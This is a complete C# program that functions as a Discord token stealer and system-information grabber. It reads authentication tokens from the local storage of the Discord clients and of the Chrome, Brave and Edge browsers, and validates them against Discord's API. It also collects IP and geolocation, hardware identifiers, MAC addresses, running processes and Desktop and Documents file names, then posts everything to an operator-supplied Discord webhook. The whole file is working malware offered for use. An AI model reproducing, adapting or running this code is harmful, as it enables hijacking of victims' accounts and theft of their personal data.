using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management; //Reference Needs to be added
using System.Net.Http;
using System.Reflection;
using System.Text;
using System.Text.Json;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Xml.Linq;
using Newtonsoft.Json.Linq; // Newtonsoft.json nuget

class Program
{
    static async Task<int> Main()
    {
        AppDomain.CurrentDomain.AssemblyResolve += (sender, args) =>
        {
            string resourceName = args.Name.Split(',')[0] + ".dll";
            string fullResourceName = Assembly.GetExecutingAssembly()
                .GetManifestResourceNames()
                .FirstOrDefault(r => r.EndsWith(resourceName));

            if (fullResourceName == null)
                return null;

            using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(fullResourceName))
            {
                if (stream == null)
                    return null;

                byte[] assemblyData = new byte[stream.Length];
                stream.Read(assemblyData, 0, assemblyData.Length);
                return Assembly.Load(assemblyData);
            }
        };
        string webhookUrl = "YOUR_DISCORD_WEBHOOK_URL"; //Put your discord webhook url 

        // Gather system info
        string ip = await GetPublicIP();
        string geo = await GetGeoInfo(ip);
        string os = GetOSInfo();
        string hwid = GetHWID();
        string ram = GetRAMInfo();
        string disk = GetDiskInfo();
        string gpu = GetGPUInfo();
        string user = GetUserInfo();
        string netAdapters = GetNetworkAdapters();
        List<string> tokens = GetDiscordTokens();

        string discordUserInfo = "No tokens found";
        if (tokens.Count > 0)
        {
            // Try get Discord user info for first token
            discordUserInfo = await GetDiscordUserInfo(tokens[0]) ?? "Unavailable";
        }

        string processes = GetProcesses();
        string importantFiles = GetImportantFiles();

        // Prepare info dictionary
        var info = new Dictionary<string, string>
        {
            {"IP Address", ip ?? "Unknown"},
            {"Geo Location", geo ?? "Unknown"},
            {"OS Info", os},
            {"HWID", hwid},
            {"RAM Info (MB)", ram},
            {"Disk Info", disk},
            {"GPU Info", gpu},
            {"User Info", user},
            {"Network Adapters", netAdapters},
            {"Discord Tokens", tokens.Count > 0 ? string.Join(", ", tokens) : "None found"},
            {"Discord User Info (from first token)", discordUserInfo},
            {"Running Processes", processes},
            {"Important Files", importantFiles}
        };

        bool success = await SendToWebhook(webhookUrl, info);

        if (success)
        {
            Console.WriteLine("Data sent successfully. Exiting...");
            return 0;
        }
        else
        {
            Console.WriteLine("Failed to send data. Saving to temp file...");
            SaveToTempFile(info);
            return 1;
        }
    }

    static async Task<bool> SendToWebhook(string url, Dictionary<string, string> info)
    {
        var embedFields = info.Select(kvp => new
        {
            name = kvp.Key,
            value = string.IsNullOrWhiteSpace(kvp.Value) ? "Unknown" : (kvp.Value.Length > 1024 ? kvp.Value.Substring(0, 1021) + "..." : kvp.Value),
            inline = false
        }).ToArray();

        var payload = new
        {
            content = (string)null,
            embeds = new[]
            {
                new
                {
                    title = "System Information",
                    color = 3447003,
                    fields = embedFields
                }
            }
        };

        string jsonString = JsonSerializer.Serialize(payload);

        try
        {
            using HttpClient client = new HttpClient();
            var content = new StringContent(jsonString, Encoding.UTF8, "application/json");
            var response = await client.PostAsync(url, content);
            return response.IsSuccessStatusCode;
        }
        catch
        {
            return false;
        }
    }

    static void SaveToTempFile(Dictionary<string, string> info)
    {
        try
        {
            string tempPath = Path.GetTempPath();
            string fileName = RandomString(10) + ".txt";
            string fullPath = Path.Combine(tempPath, fileName);

            var sb = new StringBuilder();
            foreach (var kvp in info)
            {
                sb.AppendLine($"{kvp.Key}:");
                sb.AppendLine(kvp.Value);
                sb.AppendLine(new string('-', 40));
            }

            File.WriteAllText(fullPath, sb.ToString());
            Console.WriteLine($"Saved info to: {fullPath}");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Failed to save info to temp file: {ex.Message}");
        }
    }

    static string RandomString(int length)
    {
        const string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        var random = new Random();
        return new string(Enumerable.Repeat(chars, length).Select(s => s[random.Next(s.Length)]).ToArray());
    }

    // System info methods:

    static async Task<string> GetPublicIP()
    {
        try
        {
            using var client = new HttpClient();
            return await client.GetStringAsync("https://api.ipify.org");
        }
        catch { return null; }
    }

    static async Task<string> GetGeoInfo(string ip)
    {
        if (string.IsNullOrEmpty(ip)) return null;
        try
        {
            using var client = new HttpClient();
            string url = $"http://ip-api.com/json/{ip}";
            var response = await client.GetStringAsync(url);
            var json = JObject.Parse(response);
            if (json["status"]?.ToString() == "success")
            {
                string city = json["city"]?.ToString();
                string country = json["country"]?.ToString();
                string isp = json["isp"]?.ToString();
                return $"{city}, {country} (ISP: {isp})";
            }
        }
        catch { }
        return null;
    }

    static string GetOSInfo()
    {
        return Environment.OSVersion.ToString();
    }

    static string GetHWID()
    {
        try
        {
            var searcher = new ManagementObjectSearcher("SELECT ProcessorId FROM Win32_Processor");
            foreach (ManagementObject obj in searcher.Get())
            {
                return obj["ProcessorId"]?.ToString() ?? "Unknown";
            }
        }
        catch { }
        return "Unavailable";
    }

    static string GetRAMInfo()
    {
        try
        {
            var searcher = new ManagementObjectSearcher("SELECT TotalVisibleMemorySize, FreePhysicalMemory FROM Win32_OperatingSystem");
            foreach (ManagementObject obj in searcher.Get())
            {
                ulong totalKb = (ulong)obj["TotalVisibleMemorySize"];
                ulong freeKb = (ulong)obj["FreePhysicalMemory"];
                return $"Total: {totalKb / 1024} MB, Free: {freeKb / 1024} MB";
            }
        }
        catch { }
        return "Unavailable";
    }

    static string GetDiskInfo()
    {
        try
        {
            var drives = DriveInfo.GetDrives()
                .Where(d => d.IsReady && d.DriveType == DriveType.Fixed)
                .Select(d => $"{d.Name} Total: {d.TotalSize / (1024 * 1024 * 1024)} GB, Free: {d.AvailableFreeSpace / (1024 * 1024 * 1024)} GB");
            return string.Join("\n", drives);
        }
        catch { }
        return "Unavailable";
    }

    static string GetGPUInfo()
    {
        try
        {
            var searcher = new ManagementObjectSearcher("SELECT Name FROM Win32_VideoController");
            var gpus = new List<string>();
            foreach (ManagementObject obj in searcher.Get())
            {
                gpus.Add(obj["Name"]?.ToString());
            }
            return string.Join(", ", gpus);
        }
        catch { }
        return "Unavailable";
    }

    static string GetUserInfo()
    {
        try
        {
            string username = Environment.UserName;
            string pcName = Environment.MachineName;
            return $"User: {username}, PC: {pcName}";
        }
        catch { }
        return "Unavailable";
    }

    static string GetNetworkAdapters()
    {
        try
        {
            var searcher = new ManagementObjectSearcher("SELECT MACAddress, Name FROM Win32_NetworkAdapter WHERE MACAddress IS NOT NULL AND NetEnabled = True");
            var list = new List<string>();
            foreach (ManagementObject obj in searcher.Get())
            {
                string mac = obj["MACAddress"]?.ToString();
                string name = obj["Name"]?.ToString();
                list.Add($"{name}: {mac}");
            }
            return string.Join("\n", list);
        }
        catch { }
        return "Unavailable";
    }

    static List<string> GetDiscordTokens()
    {
        string[] paths = new string[]
        {
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Discord\Local Storage\leveldb",
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discordcanary\Local Storage\leveldb",
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discordptb\Local Storage\leveldb",
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default\Local Storage\leveldb",
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb",
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Microsoft\Edge\User Data\Default\Local Storage\leveldb"
        };

        Regex tokenRegex = new Regex(@"[\w-]{24}\.[\w-]{6}\.[\w-]{27}");

        var tokens = new HashSet<string>();

        foreach (var path in paths)
        {
            if (!Directory.Exists(path))
                continue;

            var files = Directory.GetFiles(path, "*.ldb").Concat(Directory.GetFiles(path, "*.log"));

            foreach (var file in files)
            {
                try
                {
                    string content = File.ReadAllText(file);
                    foreach (Match m in tokenRegex.Matches(content))
                    {
                        tokens.Add(m.Value);
                    }
                }
                catch { }
            }
        }
        return tokens.ToList();
    }

    static async Task<string> GetDiscordUserInfo(string token)
    {
        if (string.IsNullOrEmpty(token) || token == "No token found")
            return null;

        try
        {
            using var client = new HttpClient();
            client.DefaultRequestHeaders.Add("Authorization", token);
            var response = await client.GetAsync("https://discord.com/api/v9/users/@me");
            if (response.IsSuccessStatusCode)
            {
                string json = await response.Content.ReadAsStringAsync();
                var obj = JObject.Parse(json);
                string username = obj["username"]?.ToString();
                string discriminator = obj["discriminator"]?.ToString();
                string id = obj["id"]?.ToString();
                return $"{username}#{discriminator} (ID: {id})";
            }
        }
        catch { }
        return null;
    }

    static string GetProcesses()
    {
        try
        {
            var processes = Process.GetProcesses();
            var names = processes.Select(p => p.ProcessName).Distinct().Take(20);
            return string.Join(", ", names);
        }
        catch
        {
            return "Unavailable";
        }
    }

    static string GetImportantFiles()
    {
        try
        {
            string desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string documents = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

            var desktopFiles = Directory.Exists(desktop) ? Directory.GetFiles(desktop).Select(Path.GetFileName).Take(20) : Enumerable.Empty<string>();
            var docFiles = Directory.Exists(documents) ? Directory.GetFiles(documents).Select(Path.GetFileName).Take(20) : Enumerable.Empty<string>();

            return "Desktop: " + string.Join(", ", desktopFiles) + "\nDocuments: " + string.Join(", ", docFiles);
        }
        catch
        {
            return "Unavailable";
        }
    }
}
